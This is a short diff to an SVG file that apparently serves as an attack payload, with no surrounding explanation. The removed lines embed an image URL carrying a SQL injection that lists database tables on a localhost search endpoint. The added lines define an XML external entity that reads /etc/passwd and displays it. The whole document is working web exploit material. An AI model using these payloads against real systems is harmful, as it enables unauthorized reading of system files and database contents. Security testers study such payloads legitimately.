@@ -1,3 +1,6 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
-   <image xlink:href="http://localhost/search?q=' UNION SELECT name,1 FROM sqlite_master WHERE type='table' AND name NOT LIKE 'history'--"/>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
 </svg>
